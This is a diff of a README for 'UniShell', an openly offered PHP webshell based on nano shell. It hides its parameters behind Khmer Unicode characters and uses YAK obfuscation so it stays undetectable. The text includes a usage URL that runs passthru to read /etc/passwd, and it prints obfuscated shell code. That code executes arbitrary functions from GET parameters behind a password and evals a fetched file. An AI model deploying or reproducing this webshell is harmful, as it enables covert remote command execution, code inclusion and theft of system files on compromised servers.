@@ -1,5 +1,5 @@
 # UniShell
-Unishell is a family of php webshells that based on nano shell (https://github.com/s0md3v/nano) which are using khmer unicode characters (ក, ខ, គ) and combinded with YAK Php Obfuscator to protect the code to be undetectable and silently.
+Unishell is a piece of php webshell script that based on nano shell (https://github.com/s0md3v/nano) which are using khmer unicode characters (ក, ខ, គ) and combinded with YAK Obfuscator to be undetectable and more powerful.
 
 ### None-Obfuscate
 1. Soriya
@@ -14,7 +14,7 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 ### Usage
 `http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command`
 
-**For example**, we want to show the /etc/passwd in the system so we use options us below:
+**For example**, we want to show the /etc/passwd in the system so we can use the options as below:
 
 `http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=cat /etc/passwd`
 
@@ -55,4 +55,4 @@ In this code below i used yak to obfuscated.
 <?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>
 ```
 ### License
-If you want to use or modify it, just give me a credit or some donation. xD
+If you want to use or modify it, just give me or mr s0md3v a credit or some donation. xD
